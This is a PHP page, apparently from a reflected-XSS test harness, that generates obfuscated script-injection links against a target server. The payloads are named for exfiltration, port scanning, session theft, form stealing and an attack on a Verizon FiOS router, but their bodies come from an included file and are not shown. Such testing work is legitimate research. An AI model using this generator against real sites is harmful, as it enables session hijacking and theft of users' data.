<?php
include('../declare.php');
include(INCDIR.'payload.php');

$errors = array();
$attacks = array();

function PrepareScript($testname, $obfu, $subs) {
  if (is_array($subs)) {
    // Keys from the argument will overwrite those from the base array.
    $subs = array_merge(GetBaseSubs(), $subs);
  } else if ($subs) {
    // A truthy value indicates that the base array should be used.
    $subs = GetBaseSubs();
  }
  if (is_string($obfu)) {
    $code = GetObfuscatedPayload($testname, $obfu, $subs);
  } else {
    $code = GetPayload($testname, $subs);
  }
  return urlencode('<script>'.$code.'</script>');
}

function PrepareImage($src) {
  $src = str_replace('"', '\\"', $src);
  return urlencode('<img src="'.$src.'" />');
}

$adesc = 'exfil_test';
$attacks[$adesc] = array();
foreach ($OBFUSCATIONS as $name => $obfu) {
  $exfilsub = array('TESTNAME' => $name);
  $attacks[$adesc][$name] = PrepareScript('exfil', $obfu, $exfilsub);
}

$adesc = 'exfil_clone1';
$attacks[$adesc] = array();
foreach ($OBFUSCATIONS as $name => $obfu) {
  $testsuf = 'clone1_'.$name;
  $exfilsub['TESTNAME'] = $testsuf;
  $attacks[$adesc][$name] = PrepareScript('exfil_clone1', $obfu, $exfilsub);
}

$adesc = 'exfil_clone2';
$attacks[$adesc] = array();
foreach ($OBFUSCATIONS as $name => $obfu) {
  $testsuf = 'clone2_'.$name;
  $exfilsub['TESTNAME'] = $testsuf;
  $attacks[$adesc][$name] = PrepareScript('exfil_clone2', $obfu, $exfilsub);
}

$adesc = 'exfil_clone3';
$attacks[$adesc] = array();
foreach ($OBFUSCATIONS as $name => $obfu) {
  $testsuf = 'clone3_'.$name;
  $exfilsub['TESTNAME'] = $testsuf;
  $attacks[$adesc][$name] = PrepareScript('exfil_clone3', $obfu, $exfilsub);
}

$adesc = 'exfil_clone4';
$attacks[$adesc] = array();
foreach ($OBFUSCATIONS as $name => $obfu) {
  $testsuf = 'clone4_'.$name;
  $exfilsub['TESTNAME'] = $testsuf;
  $attacks[$adesc][$name] = PrepareScript('exfil_clone4', $obfu, $exfilsub);
}

$adesc = 'exfil_clone5';
$attacks[$adesc] = array();
foreach ($OBFUSCATIONS as $name => $obfu) {
  $testsuf = 'clone5_'.$name;
  $exfilsub['TESTNAME'] = $testsuf;
  $attacks[$adesc][$name] = PrepareScript('exfil_clone5', $obfu, $exfilsub);
}

$adesc = 'portscanner';
$attacks[$adesc] = array();
foreach ($OBFUSCATIONS as $name => $obfu) {
  $attacks[$adesc][$name] = PrepareScript('portscanner', $obfu);
}

$adesc = 'redleg-array-obfuscate';
$attacks[$adesc] = array();
foreach ($OBFUSCATIONS as $name => $obfu) {
  $attacks[$adesc][$name] = PrepareScript('redleg-array-obfuscate', $obfu);
}

$adesc = 'session-steal';
$attacks[$adesc] = array();
foreach ($OBFUSCATIONS as $name => $obfu) {
  $attacks[$adesc][$name] = PrepareScript('sessionsteal', $obfu, true);
}

$adesc = 'metasploit-steal-form';
$attacks[$adesc] = array();
foreach ($OBFUSCATIONS as $name => $obfu) {
  $attacks[$adesc][$name] = PrepareScript('metasploit-steal-form', $obfu, true);
}

$adesc = 'samy-mapxss';
$attacks[$adesc] = array();
foreach ($OBFUSCATIONS as $name => $obfu) {
  $attacks[$adesc]['#comment'] = 'This attack targets the Verizon FiOS'.
    ' router. Even without this setup, the initial XMLHttpRequest can'.
    ' be observed.';
  $attacks[$adesc][$name] = PrepareScript('samy-mapxss', $obfu, true);
}

$adesc = 'image-exfil';
$attacks[$adesc] = array();
$attacks[$adesc]['basic'] = PrepareImage(MALROOT.'images/attack.png');

$title = "Malicious server prototype: Reflected XSS";
include(INCDIR.'header.php');
?>
<h1>Reflected XSS</h1>
<p class="instructions">
Clicking on the links below will initiate reflected XSS attacks on the target server.
</p>
<?
if (sizeof($errors) > 0) {
?>
<p id="errors"><?=implode('<br/>', $errors)?></p>
<?
}

// Output a link for each obfuscation of each payload.
foreach ($attacks as $aname => $attack) {
  $hname = htmlspecialchars($aname);
?>
<h3 id="<?=$hname?>" ><?=$hname?></h3>
<?
  if (isset($attack['#comment'])) {
?>
<p class="comment"><?=htmlspecialchars($attack['#comment'])?></p>
<?
  }
  foreach ($attack as $ob => $pl) {
    if (strpos($ob, '#') === 0) continue;
?>
| <a href="<?=TGTROOT?>reflected/target?value=<?=$pl?>"><?=htmlspecialchars($ob)?></a>
<?
  }
}

$links = array(
  'reflected XSS start' => TGTROOT."reflected/start",
);
include(INCDIR.'footer.php');
?>
